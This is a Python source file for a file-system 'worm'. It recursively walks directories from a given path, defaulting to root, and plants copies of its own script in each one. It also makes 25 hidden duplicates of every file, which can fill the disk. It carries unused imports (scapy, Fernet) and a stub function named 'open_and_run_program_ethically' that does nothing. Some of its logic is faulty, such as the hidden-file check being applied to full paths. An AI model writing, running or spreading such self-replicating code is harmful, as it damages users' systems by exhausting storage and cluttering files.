from scapy.all import *
import shutil
import sys
from cryptography.fernet import Fernet
import os
import subprocess

def open_and_run_program_ethically():


    program_path = os.path.join(os.path.expanduser("~"), "Downloads", "worm.py")  # Path in Downloads


open_and_run_program_ethically()



class Worm:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(iteration, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        
        
    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    
    def create_new_worm(self):
        script_name = "worm.py"  # Specify the script filename
        for directory in self.target_dir_list:
            destination = os.path.join(directory, "untitled_folder.py")
            # copy the script in the new directory with a similar name
            shutil.copyfile(script_name, destination)
            
    
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, ("." + file + str(i)))
                        shutil.copyfile(source, destination)
                        
    
    def check_worm_instances(self):
        script_name = "worm.py"  # Specify the script filename
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            count = 0
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if os.path.isfile(abs_path) and abs_path.endswith(".py") and not abs_path.startswith('.'):
                    count += 1
            if count < self.iteration:
                for i in range(self.iteration - count):
                    destination = os.path.join(directory, "untitled_folder.py")
                    shutil.copyfile(script_name, destination)
                        
    
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()
        self.check_worm_instances()
        
        
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Please provide the path to start the worm.")
    else:
        current_directory = sys.argv[1]
        worm = Worm(path=current_directory, iteration=25)
        worm.start_worm_actions()
        
       
